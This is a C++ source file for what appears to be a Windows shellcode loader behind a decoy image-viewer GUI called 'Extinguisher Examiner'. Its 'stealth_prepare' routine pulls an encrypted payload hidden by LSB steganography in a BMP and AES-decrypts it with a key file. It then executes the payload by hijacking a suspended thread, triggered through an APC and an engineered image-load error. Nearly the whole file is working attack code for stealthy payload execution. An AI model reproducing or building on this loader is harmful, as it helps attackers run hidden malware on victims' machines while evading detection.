#include <fstream>
#include "core/commands/action.h"
#include "core/extract/execution/apc.h"
#include "core/extract/execution/thread_hijack.h"
#include "core/extract/lsb_extract.h"
#include "core/aes/aes_decryptor.h"
#include "core/extract/mapping.h"
#include "utils/file_logger.h"
#include "gui/main_window.h"
#include "gui/examiner_tab.h"
#include <functional>

namespace command {

// ========== [ action class utils ] ==============
// Static member initialization
HANDLE Action::g_current_thread = NULL;
HANDLE Action::g_target_thread = NULL;
bool Action::g_gui_initialized = false;
Fl_Window* Action::g_window = NULL;
HANDLE Action::g_thread_ready_event = NULL;

bool Action::init_sync() {
    if (g_thread_ready_event == NULL) {
        g_thread_ready_event = CreateEventA(NULL, FALSE, FALSE, "Global\\ThreadReadyEvent");
        return (g_thread_ready_event != NULL);
    }
    return true;
}

void Action::cleanup_sync() {
    if (g_thread_ready_event != NULL) {
        CloseHandle(g_thread_ready_event);
        g_thread_ready_event = NULL;
    }
}

void Action::cleanup_threads() {
    // Cleanup APC thread
    if (g_current_thread != NULL) {
        CloseHandle(g_current_thread);
        g_current_thread = NULL;
    }
    
    // Cleanup target thread
    if (g_target_thread != NULL) {
        CloseHandle(g_target_thread);
        g_target_thread = NULL;
    }
}

void Action::cleanup_all() {
    // Cleanup synchronization
    cleanup_sync();
    
    // Cleanup threads
    cleanup_threads();
    
    // Note: FLTK will handle window cleanup when Fl::run() exits
    g_window = NULL;  // Just clear our reference
    g_gui_initialized = false;
}

// Main action functions
bool Action::gui_init_trigger() {
    utils::FileLogger::log("[APC] Initializing GUI with trigger");

    if (!init_sync()) {
        utils::FileLogger::log("[APC] Failed to initialize synchronization");
        return false;
    }

    // Create main window with tabs
    auto window = new gui::MainWindow(800, 600, "Extinguisher Examiner");
    g_window = window;
    
    // Get examiner tab and set up error trigger
    auto examiner = window->get_examiner_tab();
    if (examiner) {
        gui::ExaminerTab::ErrorHandler handler = std::bind(&Action::on_image_error, std::placeholders::_1);
        examiner->set_error_handler(handler);
        examiner->load_image("assets/images/lena9.bmp");
    }
    
    window->show();
    g_gui_initialized = true;
    return true;
}

//================[ APC initialization ]===================
// receive stealth_prepare here
HANDLE Action::apc_init() {
    utils::FileLogger::log("[APC] Initializing APC");
    
    // Queue APC directly with stealth_prepare
    g_current_thread = extract::APCExecutor::queue_apc_thread(stealth_prepare);
    if (!g_current_thread) {
        utils::FileLogger::log("[APC] Failed to queue APC");
        return nullptr;
    }
    
    utils::FileLogger::log("[APC] APC initialized successfully");
    return g_current_thread;
}

//=============[ Error trigger ]===================
void Action::on_image_error(DWORD threadId) {
    char msg[64];
    snprintf(msg, sizeof(msg), "[Error] Image loading error in thread: %lu", threadId);
    utils::FileLogger::log(msg);
    
    // Create new suspended thread for later hijacking
    if (g_window) {
        g_target_thread = extract::suspend_thread_load_image(g_window);
        if (!g_target_thread) {
            utils::FileLogger::log("[Error] Failed to create target thread");
            return;
        }
        // Signal that target thread is ready
        SetEvent(g_thread_ready_event);
    }
    
    // Resume APC thread to perform hijacking
    if (g_current_thread) {
        if (!extract::APCExecutor::resume_apc_thread(g_current_thread)) {
            utils::FileLogger::log("[Error] Failed to resume APC thread");
        } else {
            utils::FileLogger::log("Successfully resumed APC thread");
        }
    }
}

//================[ preparation function ]===========================
bool Action::stealth_prepare() {
    try {
        utils::FileLogger::log("[APC] Starting stealth preparation");

        // Wait for target thread to be ready
        utils::FileLogger::log("[APC] Waiting for target thread...");
        if (WaitForSingleObject(g_thread_ready_event, INFINITE) != WAIT_OBJECT_0) {
            utils::FileLogger::log("[APC] Failed to wait for target thread");
            return false;
        }

        // Extract data from lena3.bmp using LSB
        extract::LsbExtractor extractor;
        auto encrypted_data = extractor.extract("assets/images/lena3.bmp");
        if (encrypted_data.empty()) {
            utils::FileLogger::log("[APC] Failed to extract data from image");
            return false;
        }
        utils::FileLogger::log("[APC] Successfully extracted " + std::to_string(encrypted_data.size()) + " bytes");

        // Verify aes_data.bin exists and is accessible
        {
            std::ifstream test("assets/bins/aes_data.bin", std::ios::binary);
            if (!test) {
                utils::FileLogger::log("[APC] aes_data.bin not accessible at assets/bins/aes_data.bin");
                return false;
            }
            test.close();
        }

        // Map aes_data.bin to memory
        void* mapped_ptr = nullptr;
        size_t aes_data_size = 0;
        if (!extract::map_file_readonly("assets/bins/aes_data.bin", mapped_ptr, aes_data_size)) {
            utils::FileLogger::log("[APC] Failed to map AES data file");
            return false;
        }
        utils::FileLogger::log("[APC] AES data file size: " + std::to_string(aes_data_size) + " bytes");
        if (aes_data_size != 56) {
            utils::FileLogger::log("[APC] Warning: AES data size is not 56 bytes (4+32+4+16)");
        }

        // Decrypt the extracted data
        aes::AesDecryptor decryptor;
        if (!decryptor.init_from_mapped_data(mapped_ptr, aes_data_size)) {
            utils::FileLogger::log("[APC] Failed to initialize AES decryptor");
            UnmapViewOfFile(mapped_ptr);
            return false;
        }
        utils::FileLogger::log("[APC] Successfully initialized AES decryptor");
        
        utils::FileLogger::log("[APC] Encrypted data size: " + std::to_string(encrypted_data.size()) + " bytes");
        if (encrypted_data.size() < 16 || encrypted_data.size() % 16 != 0) {
            utils::FileLogger::log("[APC] Warning: Encrypted data size is not a multiple of 16 bytes");
        }
        
        auto decrypted_data = decryptor.decrypt(encrypted_data);
        
        // Clean up mapped memory after decryption
        UnmapViewOfFile(mapped_ptr);
        
        if (decrypted_data.empty()) {
            utils::FileLogger::log("[APC] Failed to decrypt data");
            return false;
        }
        utils::FileLogger::log("[APC] Successfully decrypted data, size: " + std::to_string(decrypted_data.size()));

        // Validate decrypted data size
        if (decrypted_data.size() < 100) {
            utils::FileLogger::log("[APC] Warning: Decrypted data size suspiciously small: " + std::to_string(decrypted_data.size()));
        }

        // Now safe to use g_target_thread since we waited for the event
        if (!g_target_thread) {
            utils::FileLogger::log("[APC] Target thread handle is null after wait");
            return false;
        }

        utils::FileLogger::log("[APC] Attempting to hijack suspended thread");
        if (!extract::execute_thread_hijack(g_target_thread, decrypted_data.data(), decrypted_data.size())) {
            utils::FileLogger::log("[APC] Failed to hijack thread");
            return false;
        }
        utils::FileLogger::log("[APC] Successfully hijacked thread");

        return true;
    }
    catch (const std::exception& e) {
        utils::FileLogger::log("[APC] Error in stealth preparation: " + std::string(e.what()));
        return false;
    }
}

} // namespace command 